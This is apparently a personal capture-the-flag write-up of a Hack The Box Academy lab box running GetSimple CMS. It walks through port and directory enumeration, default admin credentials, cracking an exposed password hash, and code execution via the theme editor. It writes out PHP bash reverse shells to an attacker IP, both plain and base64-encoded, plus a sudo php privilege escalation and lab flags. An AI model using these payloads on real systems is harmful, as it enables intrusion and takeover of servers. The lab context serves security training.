---
module: getting stared
section: knowledge check
url: https://academy.hackthebox.com/module/77/section/850 ff.
---

i started with a simple ping and nmap scan of the target. while the base scan ran, i decided to visit the url in my browser. a site shows up telling us that the server runs a cms called "GetSimple" (http://get-simple.info/download/). next to the copyright information there's a link named "gettingstarted" and it points to http://gettingstarted.htb/ - this link is also to be found at the very top of the page.

so let's add this to out `/etc/hosts` file and visit the page.

before doing so, let's further investigate the page source. there's nothing suspicious or particularly helpful here. however, on the page there are two broken images. they also refer to the .htb url, so adding this to the hosts file might fix this. scripts and css files are also supposed to be loaded via that vhost.

now, after adding the host, the page looks much more as intended.

![GetSimple CMS](<images/2023-12-23 htb-academy-getting-started-knowledge-check/get-simple-cms.png>)

at this point the basic nmap-scan finished and reveiled two open ports: ssh on port 22 and, as expected http on 80. let's run an `-sC` scan for these two ports:

```
$ nmap 10.129.69.221 -sV -sC -p22,80 -oA nmap-sC

Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-23 14:52 CET
Nmap scan report for 10.129.69.221
Host is up (0.059s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 4c:73:a0:25:f5:fe:81:7b:82:2b:36:49:a5:4d:c8:5e (RSA)
|   256 e1:c0:56:d0:52:04:2f:3c:ac:9a:e7:b1:79:2b:bb:13 (ECDSA)
|_  256 52:31:47:14:0d:c3:8e:15:73:e3:c4:24:a2:3a:12:77 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 1 disallowed entry
|_/admin/
|_http-title: Welcome to GetSimple! - gettingstarted
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.84 seconds
```

the robots.txt entry is already quite interesing, as it gives away where the admin portal lives, though that's not a big surprise, i guess.

![The Admin Portal](<images/2023-12-23 htb-academy-getting-started-knowledge-check/admin-login.png>)

let's run a full port scan and also a directory enumeration for the domain. while this runs, we can manually try out a few common username password combinations for the admin portal...

```
$ nmap 10.129.69.221 -sV -p- -oA nmap-full
```

reveals no new information.

```
$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://gettingstarted.htb | tee dir-enum

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://gettingstarted.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 283]
/.htaccess            (Status: 403) [Size: 283]
/.htpasswd            (Status: 403) [Size: 283]
/admin                (Status: 301) [Size: 324] [--> http://gettingstarted.htb/admin/]
/backups              (Status: 301) [Size: 326] [--> http://gettingstarted.htb/backups/]
/data                 (Status: 301) [Size: 323] [--> http://gettingstarted.htb/data/]
/index.php            (Status: 200) [Size: 5485]
/plugins              (Status: 301) [Size: 326] [--> http://gettingstarted.htb/plugins/]
/robots.txt           (Status: 200) [Size: 32]
/server-status        (Status: 403) [Size: 283]
/sitemap.xml          (Status: 200) [Size: 431]
/theme                (Status: 301) [Size: 324] [--> http://gettingstarted.htb/theme/]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

the login credentials were a pretty obvious "admin:admin":

![Admin Area](<images/2023-12-23 htb-academy-getting-started-knowledge-check/admin-area.png>)

there is a "Files" section in the admin portal. so let's see if we can upload a php file here to get remote code execution this way. unfortunately, the upload button does not do anything... also, php code injected into a new article is properly escaped... this is not the approach we should be taking.

at this point i decided to google for "getsimple cms vulnerabilities" and found several here: https://www.cvedetails.com/vulnerability-list/vendor_id-16222/product_id-36410/Get-simple-Getsimple-Cms.html and according to the admin panel, the blog runs Version 3.3.15 of GetSimple CMS. so we have

- https://www.cvedetails.com/cve/CVE-2022-41544/
- https://www.cvedetails.com/cve/CVE-2019-11231/ (which sounds promising, as its an exact version match)

furthermore, digging into this report, it's also stated that

> authentication can be bypassed. According to the official documentation for installation step 10, an admin is required to upload all the files, including the .htaccess files, and run a health check. However, what is overlooked is that the Apache HTTP Server by default no longer enables the AllowOverride directive, leading to data/users/admin.xml password exposure. The passwords are hashed but this can be bypassed by starting with the data/other/authorization.xml API key.

```
$ curl http://gettingstarted.htb/data/users/admin.xml | xmllint --format -

  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   221  100   221    0     0   3545      0 --:--:-- --:--:-- --:--:--  3564
<?xml version="1.0" encoding="UTF-8"?>
<item>
  <USR>admin</USR>
  <NAME/>
  <PWD>d033e22ae348aeb5660fc2140aec35850c4da997</PWD>
  <EMAIL>admin@gettingstarted.com</EMAIL>
  <HTMLEDITOR>1</HTMLEDITOR>
  <TIMEZONE/>
  <LANG>en_US</LANG>
</item>
```

we have already guessed the password correctly, but it would also be an option to `john the ripper`

```
$ echo -n "admin:d033e22ae348aeb5660fc2140aec35850c4da997" > admin-hash.txt
$ john -w=/usr/share/wordlists/rockyou.txt admin-hash.txt

Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-AxCrypt"
Use the "--format=Raw-SHA1-AxCrypt" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-Linkedin"
Use the "--format=Raw-SHA1-Linkedin" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "ripemd-160"
Use the "--format=ripemd-160" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "has-160"
Use the "--format=has-160" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA1 [SHA1 128/128 ASIMD 4x])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
admin            (admin)
1g 0:00:00:00 DONE (2023-12-23 19:06) 100.0g/s 1982Kp/s 1982Kc/s 1982KC/s alcala..VINCENT
Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
Session completed.
```

great. this would be a much more structured approach. but we were lucky, so i take that!

back to the vulnerability. looking at `http://gettingstarted.htb/admin/theme-edit.php` we can directly write php code. let's see if can, in fact, get code execution on the target:

![Checking for Code Execution](<images/2023-12-23 htb-academy-getting-started-knowledge-check/code-execution-test.png>)

and yes, it works. (the style property needs to be manually removed via the dev tools, otherwise it would be too obvious for visitors.)

![Checking for Code Execution - Confirmation](<images/2023-12-23 htb-academy-getting-started-knowledge-check/code-execution-test-confirmation.png>)

we could add our code to establish a shell session right here, but that would be too obvious. let's see how we can exploit this to upload out own php file. we could try to pipe our webshell script into a file. at the end, the file should contain

```
<?php echo system('bash -c \'bash -i >& /dev/tcp/10.10.14.24/1337 0>&1\''); ?>
```

since this gets escaped, let's see if we can base64 encode it first...

```
$ echo "<?php echo system('bash -c \'bash -i >& /dev/tcp/10.10.14.24/1337 0>&1\''); ?>" | base64

PD9waHAgZWNobyBzeXN0ZW0oJ2Jhc2ggLWMgXCdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjI0LzEzMzcgMD4mMVwnJyk7ID8+Cg==
```

so let's add this to the template file.

```
<?php system("echo 'PD9waHAgZWNobyBzeXN0ZW0oJ2Jhc2ggLWMgXCdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjI0LzEzMzcgMD4mMVwnJyk7ID8+Cg==' | base64 -d > data/sh.php"); ?>
```

as soon as the file is written, verify that it's there (browse to http://gettingstarted.htb/data/) and then comment out or remove the line from the template php file.

i set up a local `nc -lnvp 1337` listener and opened the file in the browser. tadaa. we got a reverse shell.

just as with the nibble box, `which python3` shows us that python is available, so let's upgrade our shell...

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

navigate to `/home/mrb3n` and find the `flag.txt` file.

```
7002d65b149b0a4d19132a66feed21d8
```

download `LinEnum.sh` and serve it from the attacker vm with `sudo python3 -m http.server 8080`, then download it from the target vm with `wget http://10.10.14.24:8080/LinEnum.sh` (make sure to first navigate back to `var/www/html/data`). then run it!

```
$ chmod +x LinEnum.sh
$ ./LinEnum.sh

... SNIP ...

[+] We can sudo without supplying a password!
Matching Defaults entries for www-data on gettingstarted:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on gettingstarted:
    (ALL : ALL) NOPASSWD: /usr/bin/php


[+] Possible sudo pwnage!
/usr/bin/php

... SNIP ...
```

we can escalate by providing a reverse shell through `sudo php root.php`. we just need to create this file. we can do it locally and then download it to the target, as we did earlier. here's what it looks like:

```
$ cat root.php
<?php echo system('bash -c \'bash -i >& /dev/tcp/10.10.14.24/4711 0>&1\''); ?>
```

serve and download it just like the LinEnum file earlier, setup a nc listener on port 4711 and run `sudo php root.php`.

the root flag is:

```
$ cat ~/root.txt

f1fba6e9f71efb2630e6e34da6387842
```
